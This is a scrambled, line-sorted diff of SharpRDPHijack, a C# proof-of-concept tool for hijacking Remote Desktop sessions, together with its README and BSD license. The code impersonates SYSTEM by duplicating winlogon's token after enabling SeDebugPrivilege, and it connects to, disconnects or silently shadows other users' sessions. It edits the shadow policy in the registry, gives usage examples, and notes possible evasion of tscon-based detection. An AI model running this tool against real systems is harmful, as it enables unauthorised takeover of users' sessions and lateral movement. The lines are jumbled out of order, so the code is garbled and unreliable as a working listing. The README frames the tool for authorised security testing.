@@ -1,0 +1,506 @@
+                
+                            activeSession = session_info.SessionId
+                        //Session Id
+                        //Session State
+                        //Session User
+                        GetTSSessions(tsquery)
+                        ShadowConnect(session)
+                        Win32.WTSFreeMemory(domainPtr)
+                        Win32.WTSFreeMemory(userPtr)
+                        activePolicy = (int)registryValue
+                        activePolicy = -2
+                        connect = false
+                        console = true
+                        current 
+                        currentSession 
+                        disconnect = true
+                        else
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSConnectQuery)
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSConnected)
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSDisconnected)
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSDown)
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSIdle)
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSInit)
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSListen)
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSReset)
+                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSShadow)
+                        if (session_info.State == Win32.WTS_CONNECTSTATE_CLASS.WTSActive)
+                        if (si.SessionId == console)
+                        if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSActive)
+                        return
+                        shadow = false
+                        shadow = true
+                    //'Winlogon.exe' technique from @monoxgas [https://twitter.com/monoxgas/status/1109892490566336512]
+                    //Adjust (add) SeDebugPrivilege
+                    //Impersonate a process with NT AUTHORITY
+                    IntPtr current = pSessions
+                    Registry.LocalMachine.DeleteSubKeyTree(regKey)
+                    Usage()
+                    Win32.WTSFreeMemory(buffer)
+                    Win32.WTSFreeMemory(pSessions)
+                    else
+                    else // Value exists - change it
+                    for (int i = 0
+                    if (!ImpersonateContext(proc))
+                    if (args.Length > 1)
+                    if (console)
+                    if (registryValue == null) //Value does not exist - create it
+                    if (res != 0)
+                    int console = Win32.WTSGetActiveConsoleSessionId()
+                    key = Registry.LocalMachine.CreateSubKey(regKey)
+                    key.DeleteValue(shadowValue)
+                    object registryValue = key.GetValue(shadowValue)
+                    receiver = GetActiveSession()
+                    receiver = Win32.WTSGetActiveConsoleSessionId()
+                    return
+                    return false
+                    username = Marshal.PtrToStringAnsi(buffer) 
+                    {
+                    }
+                // ------ RDP / TS Session Query...
+                // ------ RDP Session Hijack...
+                //Check for Shadow policy in Registry and set new policy (if not a value of 2)
+                //Check if elevated admin
+                //Cleanup registry
+                //Get active session for redirection (either current session or console (if --console is specified)
+                //Launch mstsc.exe to shadow RDP session
+                //Perform WTS action 
+                //Perform shadow action
+                //Quick Arg Parser/Validationr
+                //if (retVal != 0)
+                Int32 dataSize = Marshal.SizeOf(typeof(Win32.WTS_SESSION_INFO))
+                Int32 dwSessionCount = 0
+                IntPtr currentSession = pSessions
+                IntPtr domainPtr = IntPtr.Zero
+                IntPtr duplicateTokenHandle = IntPtr.Zero
+                IntPtr hproc = Win32.GetCurrentProcess()
+                IntPtr htok = IntPtr.Zero
+                IntPtr pSessions = IntPtr.Zero
+                IntPtr procToken = IntPtr.Zero
+                IntPtr userPtr = IntPtr.Zero
+                Process process = impProcess[0]
+                Process process = new Process()
+                Process.Start(process.StartInfo)
+                Process[] impProcess = Process.GetProcessesByName(proc)
+                TOKEN_ADJUST_PRIVILEGES 
+                TOKEN_ADJUST_SESSIONID)
+                TOKEN_DUPLICATE 
+                Thread.Sleep(3000)
+                Win32.TokPriv1Luid tp
+                Win32.WTSCloseServer(serverHandle)
+                Win32.WTSFreeMemory(buffer)
+                bool connect = true
+                bool console = false
+                bool disconnect = false
+                bool retVal
+                bool shadow = false
+                else
+                else //Create/adjust value
+                else //Restore policy
+                else if (activePolicy == -2)  //Remove value
+                else if (connect)
+                foreach (string arg in args)
+                if (!IsElevatedAdmin())
+                if (!retVal)
+                if (activePolicy == -1) //Remove registry key
+                if (args.Length == 0)
+                if (console)
+                if (disconnect)
+                if (key == null) //Create Key and value
+                if (pSessions != IntPtr.Zero)
+                if (retVal)
+                if (session < 0)
+                if (shadow)
+                if (tsquery.Length > 0)
+                int receiver = -1
+                int res = -1
+                int session = -1
+                process.StartInfo = new ProcessStartInfo
+                res = -1
+                return false
+                return retVal
+                return true
+                tp.Attr = Win32.SE_PRIVILEGE_ENABLED
+                tp.Count = 1
+                tp.Luid = 0
+                username = Marshal.PtrToStringAnsi(buffer)
+                {
+                }
+            //Check to see if current identity is admin
+            AppDomain myDomain = Thread.GetDomain()
+            IntPtr buffer
+            IntPtr pSessions = IntPtr.Zero
+            IntPtr serverHandle = IntPtr.Zero
+            List<int> sids = new List<int>()
+            List<string> resultList = new List<string>()
+            WTSClientProtocolType
+            WindowsPrincipal myPrincipal = (WindowsPrincipal)Thread.CurrentPrincipal
+            catch
+            catch (Exception e)
+            catch (Exception ex)
+            finally
+            if (myPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
+            int activePolicy = -1
+            int activeSession = 0
+            int dwSessionCount = 0
+            myDomain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal)
+            public IntPtr pWinStationName
+            public LUID Luid
+            public LUID_AND_ATTRIBUTES[] Privileges
+            public UInt32 Attributes
+            public UInt32 HighPart
+            public UInt32 LowPart
+            public UInt32 PrivilegeCount
+            public WTS_CONNECTSTATE_CLASS State
+            public int Attr
+            public int Count
+            public int SessionId
+            public long Luid
+            return activeSession
+            return false
+            return username
+            serverHandle = Win32.WTSOpenServer(serverName)
+            try
+            uint strLen
+            {
+            }
+        // --------------------------------------------------------------------------
+        // ----------------------------------------WTS P-Invoke Definitions
+        // RDP / TS Session Hijack Functions
+        // RDP / TS Session Query Functions
+        // https://docs.microsoft.com/en-us/dotnet/api/system.security.principal.windowsprincipal.isinrole
+        // https://gallery.technet.microsoft.com/scriptcenter/Enable-TSDuplicateToken-6f485980
+        // https://www.pinvoke.net/default.aspx/advapi32.adjusttokenprivileges
+        //--------------------- CSharp Elevation/Priv/Impersonation Code. References:
+        //Slightly modified code from James Forshaw's COM Session Moniker EoP Exploit 
+        //https://www.pinvoke.net/default.aspx/wtsapi32.wtsquerysessioninformation
+        [StructLayout(LayoutKind.Sequential)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public const UInt32 STANDARD_RIGHTS_READ = 0x00020000
+        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000
+        public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080
+        public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040
+        public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100
+        public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED 
+        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001
+        public const UInt32 TOKEN_DUPLICATE = 0x0002
+        public const UInt32 TOKEN_IMPERSONATE = 0x0004
+        public const UInt32 TOKEN_QUERY_SOURCE = 0x0010
+        public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ 
+        public const int ANYSIZE_ARRAY = 1
+        public const int SE_PRIVILEGE_ENABLED = 0x00000002
+        public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020
+        public const int TOKEN_QUERY = 0x00000008
+        public enum WTS_CONNECTSTATE_CLASS
+        public enum WTS_INFO_CLASS
+        public static extern IntPtr GetCurrentProcess()
+        public static extern IntPtr WTSOpenServer([MarshalAs(UnmanagedType.LPStr)] string pServerName)
+        public static extern int WTSGetActiveConsoleSessionId()
+        public static extern void WTSCloseServer(IntPtr hServer)
+        public static extern void WTSFreeMemory(IntPtr memory)
+        public static void GetTSSessions(string serverName)
+        public struct LUID
+        public struct LUID_AND_ATTRIBUTES
+        public struct TOKEN_PRIVILEGES
+        public struct TokPriv1Luid
+        public struct WTS_SESSION_INFO
+        static bool AdjustTokenPrivilege(string priv)
+        static bool ImpersonateContext(string proc)     //Duplicate token via target process handle
+        static bool IsElevatedAdmin()
+        static int GetActiveSession()
+        static void Main(string[] args)
+        static void ShadowConnect(int sessionId)
+        static void Usage()
+        {
+        }
+    --console : Redirect session to console session instead of current (active) session
+    --disconnect : Disconnect an active (remote) session
+    --password=<User's Password> : Session password if known (otherwise optional - not required for disconnect switch)
+    --session=<ID> : Target session identifier
+    --shadow : Shadow an active session (experimental)
+    --tsquery=<host> : Query a host to identify RDP/TS session information (not required for other switches)
+    SharpRDPHijack.exe --session=2 --console
+    SharpRDPHijack.exe --session=2 --shadow --console
+    SharpRDPHijack.exe --session=3 --disconnect
+    SharpRDPHijack.exe --session=3 --shadow
+    SharpRDPHijack.exe --session=4 --password=P@ssw0rd
+    SharpRDPHijack.exe --session=6
+    SharpRDPHijack.exe --tsquery=localhost
+    class Program
+    class Win32
+    {
+    }
+   and/or other materials provided with the distribution.
+   contributors may be used to endorse or promote products derived from
+   list of conditions and the following disclaimer.
+   this list of conditions and the following disclaimer in the documentation
+   this software without specific prior written permission.
+ // Don't need length as these are null terminated strings
+ // Prepend domain name
+ //Assuming DWORD value
+ Background
+ Credits
+ Ethics
+ Notes
+ OR BUSINESS INTERRUPTION) HOWEVER
+ Other Notable Implementations
+ RDP hijacking 
+ Remote Desktop Protocol (RDP) session hijack utility.
+ Resources with Defensive Considerations
+ SharpRDPHijack
+ T1076: RDP Hijacking for Lateral Movement with tscon](https://ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement)
+ TOKEN_ADJUST_DEFAULT 
+ TOKEN_ADJUST_GROUPS 
+ TOKEN_ASSIGN_PRIMARY 
+ TOKEN_IMPERSONATE 
+ TOKEN_QUERY 
+ TOKEN_QUERY)
+ TOKEN_QUERY_SOURCE 
+ Usage
+ e.Message 
+ ex.Message.ToString() 
+ how to hijack RDS and RemoteApp sessions transparently to move through an organisation](https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
+ i < dwSessionCount
+ proc 
+ session.ToString() 
+ sessionId.ToString() 
+ several P-Invoke definitions [https://www.exploit-db.com/exploits/41607]
+ si.SessionId.ToString() 
+ si.SessionId.ToString())
+ state)
+ strLen > 1)
+ supporting command usage.  Defensive guidance in the linked resources page are useful for addressing abuse of this technique (e.g. logging off disconnected sessions after a timeout period in Group Policy) as well as implementing domain admin login resiliency best practices to minimize domain exposure where non-DA accounts have admin rights on machines also used by DAs. 
+ username
+ username)
+"                            Console.WriteLine("""
+"                            state = ""Active"""
+"                            state = ""ConnectQuery"""
+"                            state = ""Connecting"""
+"                            state = ""Disconnected"""
+"                            state = ""Down due to error"""
+"                            state = ""Idle and waiting for connection"""
+"                            state = ""Listening for a connection"""
+"                            state = ""Resetting a connection"""
+"                            state = ""Shadowing"""
+"                            state = ""initializing"""
+"                        Console.WriteLine("""
+"                        Console.WriteLine(""Identity: "" "
+"                        Console.WriteLine(""Session State: "" "
+"                        Win32.WTS_SESSION_INFO session_info = (Win32.WTS_SESSION_INFO)Marshal.PtrToStructure(current, typeof(Win32.WTS_SESSION_INFO))"
+"                        Win32.WTS_SESSION_INFO si = (Win32.WTS_SESSION_INFO)Marshal.PtrToStructure((System.IntPtr)currentSession, typeof(Win32.WTS_SESSION_INFO))"
+"                        key.SetValue(shadowValue, 2, RegistryValueKind.DWord)"
+"                        password = arg.Split(new string[] { ""--password="" }, StringSplitOptions.None)[1]"
+"                        res = Win32.WTSConnectSession(session, receiver, password, true)"
+"                        session = Int32.Parse(arg.Split(new string[] { ""--session="" }, StringSplitOptions.None)[1])"
+"                        string state = ""Unknown"""
+"                        string username = """""
+"                        tsquery = arg.Split(new string[] { ""--tsquery="" }, StringSplitOptions.None)[1]"
+"                        username = GetUsernameBySessionId(serverHandle, si.SessionId)"
+"                    Arguments = args,"
+"                    Console.WriteLine("""
+"                    FileName = mstsc,"
+"                    if (!AdjustTokenPrivilege(""SeDebugPrivilege""))"
+"                    if (arg.StartsWith(""--console""))"
+"                    if (arg.StartsWith(""--disconnect""))"
+"                    if (arg.StartsWith(""--password=""))"
+"                    if (arg.StartsWith(""--session=""))"
+"                    if (arg.StartsWith(""--shadow""))"
+"                    if (arg.StartsWith(""--tsquery=""))"
+"                    key.SetValue(shadowValue, 2, RegistryValueKind.DWord)"
+"                    key.SetValue(shadowValue, activePolicy, RegistryValueKind.DWord)"
+"                    res = Win32.WTSConnectSession(session, receiver, password, true)"
+"                    res = Win32.WTSDisconnectSession(IntPtr.Zero, session, true)"
+"                    string proc = ""winlogon"""
+"                //If password is not supplied, attempt to impersonate NT AUTHORITY"
+"                //Session is mandatory - if not selected, display usage"
+"                //if no args, display usage"
+"                Console.WriteLine("""
+"                Console.WriteLine("""")"
+"                RegistryKey key = Registry.LocalMachine.OpenSubKey(regKey, writable: true)"
+"                bool retVal = Win32.WTSEnumerateSessions(serverHandle, 0, 1, out pSessions, out dwSessionCount)"
+"                if (Win32.WTSEnumerateSessions(IntPtr.Zero, 0, 1, out pSessions, out dwSessionCount))"
+"                if (Win32.WTSQuerySessionInformation(serverHandle, sessionId, Win32.WTS_INFO_CLASS.WTSDomainName, out buffer, out strLen) "
+"                if (password == """")"
+"                retVal = Win32.AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero)"
+"                retVal = Win32.DuplicateToken(procToken, 2, out duplicateTokenHandle)"
+"                retVal = Win32.LookupPrivilegeValue(null, priv, ref tp.Luid)"
+"                retVal = Win32.OpenProcessToken(hproc, Win32.TOKEN_ALL_ACCESS, out htok)"
+"                retVal = Win32.OpenProcessToken(process.Handle, Win32.TOKEN_IMPERSONATE "
+"                retVal = Win32.SetThreadToken(IntPtr.Zero, duplicateTokenHandle)"
+"                string args = ""/shadow:"" "
+"                string mstsc = Environment.GetEnvironmentVariable(""SystemRoot"") "
+"                string password = """""
+"                string tsquery = """""
+"            Console.WriteLine(""    - For session hijacking, this utility must be run in an elevated context to connect to another session"")"
+"            Console.WriteLine(""    - For session query, admin privileges or "
+"            Console.WriteLine(""    - If a password is not specified, NT AUTHORITY"
+"            Console.WriteLine(""    --console : Redirect session to console session instead of current (active) session"")"
+"            Console.WriteLine(""    --disconnect : Disconnect an active (remote) session"
+"            Console.WriteLine(""    --password=<User's Password> : Session password if known (otherwise optional - not required for disconnect switch)"")"
+"            Console.WriteLine(""    --session=<ID> : Target session identifier"")"
+"            Console.WriteLine(""    --shadow : Shadow an active session (experimental)"")"
+"            Console.WriteLine(""    --tsquery=<host> : Query a host to identify RDP/TS session information (not required for other switches)"")"
+"            Console.WriteLine(""    SharpRDPHijack.exe --session=2 --console"
+"            Console.WriteLine(""    SharpRDPHijack.exe --session=2 --shadow --console"
+"            Console.WriteLine(""    SharpRDPHijack.exe --session=3 --disconnect"
+"            Console.WriteLine(""    SharpRDPHijack.exe --session=3 --shadow"
+"            Console.WriteLine(""    SharpRDPHijack.exe --session=4 --password=P@ssw0rd"
+"            Console.WriteLine(""    SharpRDPHijack.exe --session=6"
+"            Console.WriteLine(""    SharpRDPHijack.exe --tsquery=localhost"
+"            Console.WriteLine(""----------------"
+"            Console.WriteLine(""["
+"            WTSActive,              // User logged on to WinStation"
+"            WTSApplicationName,"
+"            WTSClientAddress,"
+"            WTSClientBuildNumber,"
+"            WTSClientDirectory,"
+"            WTSClientDisplay,"
+"            WTSClientHardwareId,"
+"            WTSClientName,"
+"            WTSClientProductId,"
+"            WTSConnectQuery,        // In the process of connecting to client"
+"            WTSConnectState,"
+"            WTSConnected,           // WinStation connected to client"
+"            WTSDisconnected,        // WinStation logged on without client"
+"            WTSDomainName,"
+"            WTSDown,                // WinStation is down due to error"
+"            WTSIdle,                // Waiting for client to connect"
+"            WTSInit,                // WinStation in initialization"
+"            WTSInitialProgram,"
+"            WTSListen,              // WinStation is listening for connection"
+"            WTSOEMId,"
+"            WTSReset,               // WinStation is being reset"
+"            WTSSessionId,"
+"            WTSShadow,              // Shadowing another WinStation"
+"            WTSUserName,"
+"            WTSWinStationName,"
+"            WTSWorkingDirectory,"
+"            [MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)]"
+"            if (Win32.WTSQuerySessionInformation(serverHandle, sessionId, Win32.WTS_INFO_CLASS.WTSUserName, out buffer, out strLen) "
+"            string regKey = @""SOFTWARE"
+"            string shadowValue = ""Shadow"""
+"            var username = """""
+"        // ---------------------------------------- Token Duplication P-Invoke Definitions [https://gallery.technet.microsoft.com/scriptcenter/Enable-TSDuplicateToken-6f485980 and Goude 2012, TreuSec (http://www.truesec.com )]"
+"        [DllImport(""advapi32.dll"", ExactSpelling = true, SetLastError = true)]"
+"        [DllImport(""advapi32.dll"", SetLastError = true)]"
+"        [DllImport(""kernel32.dll"")]"
+"        [DllImport(""kernel32.dll"", ExactSpelling = true)]"
+"        [DllImport(""wtsapi32.dll"")]"
+"        [DllImport(""wtsapi32.dll"", CharSet = CharSet.Auto, SetLastError = true)]"
+"        [DllImport(""wtsapi32.dll"", SetLastError = true)]"
+"        [StructLayout(LayoutKind.Sequential, Pack = 1)]"
+"        public const string SE_TIME_ZONE_NAMETEXT = ""SeTimeZonePrivilege"""
+"        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle)"
+"        public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen)"
+"        public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid)"
+"        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle)"
+"        public static extern bool SetThreadToken(IntPtr PHThread, IntPtr Token)"
+"        public static extern bool WTSEnumerateSessions(IntPtr hServer, int Reserved, int Version, out IntPtr ppSessionInfo, out int pCount)"
+"        public static extern bool WTSQuerySessionInformation(IntPtr hServer, int sessionId, WTS_INFO_CLASS wtsInfoClass, out IntPtr ppBuffer, out uint pBytesReturned)"
+"        public static extern int WTSConnectSession(int targetSessionId, int sourceSessionId, string password, bool wait)"
+"        public static extern int WTSDisconnectSession(IntPtr hServer, int sessionId, bool bWait)"
+"        static string GetUsernameBySessionId(IntPtr serverHandle, int sessionId)"
+"    - For session hijacking, this utility must be run in an elevated context to connect to another session"
+"    - For session query, admin privileges or ""Remote Desktop Users"" group membership is required on the target machine"
+"    - If a password is not specified, NT AUTHORITY"
+"    //grabs first process - depending on use case, may need to clean up or call by PID instead"
+" "" [Console]"")"
+" @"" /control /noConsentPrompt"""
+" LOSS OF USE, DATA, OR PROFITS"
+" Server session hijacking exhibits interesting behavior vs prior OS versions. Upon hijacking a session that is redirected to an activated RDP session, the Windows login screen prompts for the user's password/credential. If redirected to the console session, this redirection is successful and seamless. Leverage the --shadow option with the --console option to attempt to connect to the session via RDP shadowing."
+" Win32.TOKEN_DUPLICATE, out procToken)"
+""" group membership is required on the target machine"
+"""Remote Desktop Users"
+").  In this implementation, the two functions/methods that do the heavy lifting are [WTSConnectSession](https://docs.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsconnectsessiona) and [WTSDisconnectSession](https://docs.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsdisconnectsession).  "
+"- Potentially, there is an advantage such that this utility could evade specific detection analytics for tscon.exe "
+"1. Redistributions of source code must retain the above copyright notice, this"
+"2 and redirect to the console session"")"
+"2 by redirecting the session to the console"")"
+"2. Redistributions in binary form must reproduce the above copyright notice,"
+"4 with knowledge of the logged-on user's password"")"
+"6 and redirect to the current session"")"
+"AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE"
+"CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,"
+"Copyright (c) 2020, bohops"
+"DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR"
+"FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL"
+"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
+"Redistribution and use in source and binary forms, with or without"
+"SYSTEM context is required to take control of a session unless a target session user's password is known. Without a supplied password, SharpRDPHijack will (attempt to) impersonate NT AUTHORITY"
+"SYSTEM is impersonated"")"
+"THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"""
+"Terminal Services"""
+"] A proof-of-concept Remote Desktop (RDP) session hijack utility"")"
+"] Example Usage 5: Query the local host for RDP/TS session information"")"
+"] Parameters:"")"
+"modification, are permitted provided that the following conditions are met:"
+"mstsc.exe"""
+"n [-] Error: "" "
+"nSession ID: "" "
+"n[-] Could not impersonate target context from process: "" "
+"n[-] Error: "" "
+"n[-] Failed to connect to session: "" "
+"n[-] For RDP hijack, this program must be run in elevated administrator context"
+"n[-] For RDP session query, only use the '--tsquery' switch"
+- NT AUTHORITY
+- Session hijacking requires an elevated (administrator) context to connect to another session.
+- Several folks have inquired about the function/necessity of this utility when you can do the same thing with tscon.exe or Mimikatz TS.  The goal of writing this POC was to gain a better understanding of what was happening at the Win32 API level (more specifically - Wtsapi32) and to have a simpler option for connecting to other sessions (preferably in C
+- SharpRDPHijack.cs compiles in Visual Studio 2022 under .NET Framework v.4.8 (and likely earlier versions).
+- TS/RDP Session query may require privileges depending on the target machine. 
+- Windows 2019
+- [Benjamin Delpy - RDP Session Tradecraft](http://blog.gentilkiwi.com/securite/vol-de-session-rdp)
+- [Enable-TSDuplicateToken](https://gallery.technet.microsoft.com/scriptcenter/Enable-TSDuplicateToken-6f485980)
+- [James Forshaw - COM Session Moniker EoP Exploit](https://www.exploit-db.com/exploits/41607)
+- [Kevin Beaumont 
+- [Mimikatz](https://github.com/gentilkiwi/mimikatz) - TS Module
+- [Nick Landers - StealToken Trick](https://twitter.com/monoxgas/status/1109892490566336512)
+- [PInvoke](https://www.pinvoke.net/)
+- [Red Team Experiments 
+- [TScon](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) - Microsoft Terminal Services connection utility (tscon.exe)
+2 and redirect to the console session
+2 by redirecting the session to the console
+3. Neither the name of the copyright holder nor the names of its
+4 with knowledge of the logged-on user's password
+6 and redirect to the current session
+= Marshal.SizeOf(typeof(Win32.WTS_SESSION_INFO))
+= dataSize
+All rights reserved.
+BSD 3-Clause License
+CK T1563.002 - Remote Service Session Hijacking: RDP Hijacking](https://attack.mitre.org/techniques/T1563/002/).
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+Microsoft
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+Policies
+RDP session hijacking is a post-exploitation technique for taking control of (forcefully) disconnected interactive login sessions. The technique is described in [Mitre ATT
+SERVICES
+SYSTEM and connect
+SYSTEM context
+SYSTEM is impersonated
+SYSTEM to hijack session 
+SYSTEM.
+Sharp RDP Hijack is a proof-of-concept .NET/C
+Sharp RDP Hijack is designed to help security professionals perform ethical and legal security assessments and penetration tests. Do not use for nefarious purposes.
+System32
+Windows NT
+] A proof-of-concept Remote Desktop (RDP) session hijack utility
+] Example Usage 1: Impersonate NT AUTHORITY
+] Example Usage 2: Impersonate NT AUTHORITY
+] Example Usage 3: Hijack Remote Desktop session 
+] Example Usage 4: Disconnect active session 
+] Example Usage 5: Query the local host for RDP/TS session information
+] Example Usage 6: Shadow active session 
+] Example Usage 7: Shadow inactive session 
+] Parameters:
+n----------------
+nSharp RDP Hijack
+n[-] Could not adjust token privilege: SeDebugPrivilege
+namespace SharpRDPHijack
+using Microsoft.Win32
+using System
+using System.Collections.Generic
+using System.Diagnostics
+using System.Runtime.InteropServices
+using System.Security.Principal
+using System.Threading
+view=dotnet-plat-ext-3.1
